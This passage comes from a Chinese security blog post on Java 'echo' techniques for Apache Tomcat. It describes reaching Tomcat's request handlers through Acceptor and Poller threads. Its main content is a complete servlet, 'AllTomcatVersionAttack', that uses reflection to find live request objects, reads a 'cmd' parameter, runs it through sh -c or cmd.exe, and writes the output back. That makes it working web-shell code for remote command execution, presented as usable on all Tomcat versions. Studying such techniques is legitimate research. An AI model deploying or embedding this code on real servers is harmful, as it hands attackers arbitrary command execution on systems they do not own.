<p>低版本Tomcat 8和9</p>
<p><img src="/./images/image-20240731022626488.png" alt="image-20240731022626488"></p>
<p>通过NioEndpoint通杀Tomcat8和9的高低版本。具体参考<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/30/Java-%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#Tomcat%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98">Java 回显技术 | Drunkbaby’s Blog (drun1baby.top)</a></p>
<p>言简意赅就是我们需要的<code>AbstractProtocol$ConnectoinHandler</code>属性的Handler也存在于NioEndpoint中。如果能获取到NioEn</p>
<p><img src="/./images/image-20240731043802388.png" alt="image-20240731043802388"></p>
<h4 id="通过Acceptor获取NioEndpoint"><a href="#通过Acceptor获取NioEndpoint" class="headerlink" title="通过Acceptor获取NioEndpoint"></a>通过<strong>Acceptor</strong>获取NioEndpoint</h4><p>遍历线程，获取线程中的target属性，如果该target是Acceptor类的话则其endpoint属性就是NioEndpoint 对象。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getThreadGroup() --&gt; theads[] --&gt; thread --&gt; target --&gt; NioEndpoint$Poller --&gt; NioEndpoint --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<h4 id="通过poller获取NioEndpoint"><a href="#通过poller获取NioEndpoint" class="headerlink" title="通过poller获取NioEndpoint"></a>通过<strong>poller</strong>获取NioEndpoint</h4><p>遍历线程，获取线程中的target属性，如果target属性是 NioEndpoint$Poller 类的话，通过获取其父类 NioEndpoint，进而获取到 AbstractProtocolConnectoinHandler。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getThreadGroup() --&gt; theads[] --&gt; thread --&gt; target --&gt; NioEndpoint$Poller --&gt; NioEndpoint --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<h4 id="通用版"><a href="#通用版" class="headerlink" title="通用版"></a>通用版</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全 Tomcat 版本通用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/AllTomcat&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AllTomcatVersionAttack</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取thread数组</span></span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">threadGroup</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threadsField</span> <span class="operator">=</span>  ThreadGroup.class.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threadsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] threads = (Thread[])threadsField.get(threadGroup);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(Thread thread:threads) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">targetField</span> <span class="operator">=</span> Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                targetField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span>  <span class="operator">=</span> targetField.get(thread);</span><br><span class="line">                <span class="keyword">if</span>( target != <span class="literal">null</span> &amp;&amp; target.getClass() == org.apache.tomcat.util.net.Acceptor.class ) &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">endpointField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.net.Acceptor&quot;</span>).getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                    endpointField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">endpoint</span> <span class="operator">=</span> endpointField.get(target);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.net.AbstractEndpoint&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                    handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> handlerField.get(endpoint);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 获取内部类ConnectionHandler的global</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalField.get(handler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 获取RequestGroupInfo的processors</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">processors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    java.util.List&lt;RequestInfo&gt; RequestInfolist = (java.util.List&lt;RequestInfo&gt;) processors.get(global);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 获取Response，并做输出处理</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">for</span> (RequestInfo requestInfo : RequestInfolist) &#123;<span class="comment">//遍历</span></span><br><span class="line">                        org.apache.coyote.<span class="type">Request</span> <span class="variable">coyoteReq</span> <span class="operator">=</span> (org.apache.coyote.Request) reqField.get(requestInfo);<span class="comment">//获取request</span></span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">connectorRequest</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) coyoteReq.getNote(<span class="number">1</span>);<span class="comment">//获取catalina.connector.Request类型的Request</span></span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">connectorResponse</span> <span class="operator">=</span> connectorRequest.getResponse();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 从connectorRequest 中获取参数并执行</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> connectorRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        connectorResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                        <span class="comment">// 方法一</span></span><br><span class="line"><span class="comment">//                   String res = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();</span></span><br><span class="line"><span class="comment">//                connectorResponse.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));</span></span><br><span class="line"><span class="comment">//                connectorResponse.flushBuffer();</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 方法二</span></span><br><span class="line">                        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="comment">// 判断操作系统类型</span></span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                isLinux = <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 根据操作系统类型设置命令执行方式</span></span><br><span class="line">                            String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            <span class="comment">// 执行命令并获取输入流</span></span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="comment">// 将命令执行结果写入响应</span></span><br><span class="line">                            connectorResponse.getWriter().write(output);</span><br><span class="line">                            connectorResponse.getWriter().flush();</span><br><span class="line">                            connectorResponse.getWriter().close();</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7348?time__1311=n4+xnD0Dy7=Yq0KitD/iW+RgDuArtDBYrWrYD">Tomcat中一种半通用回显方法 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/30/Java-%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#Tomcat%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98">Java 回显技术 | Drunkbaby’s Blog (drun1baby.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog (goodapple.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究 (qq.com)</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">java回显技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ThreadLocal-Response%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.</span> <span class="toc-text">ThreadLocal Response回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Demo"><span class="toc-number">1.1.2.</span> <span class="toc-text">编写Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99%EF%BC%88getWriter%E9%87%8D%E5%A4%8D%E4%BD%BF%E7%94%A8%E6%8A%A5%E9%94%99%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">回显报错（getWriter重复使用报错）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">1.1.5.</span> <span class="toc-text">局限性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8Response%E5%9B%9E%E6%98%BE"><span class="toc-number">1.2.</span> <span class="toc-text">通过全局存储Response回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96StandardService"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">如何获取StandardService</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.3.</span> <span class="toc-text">Tomcat版本问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Acceptor%E8%8E%B7%E5%8F%96NioEndpoint"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">通过Acceptor获取NioEndpoint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87poller%E8%8E%B7%E5%8F%96NioEndpoint"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">通过poller获取NioEndpoint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%89%88"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">通用版</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">1.3.</span> <span class="toc-text">Ref</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&text=java回显技术"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&is_video=false&description=java回显技术"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=java回显技术&body=Check out this article: http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&name=java回显技术&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&t=java回显技术"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
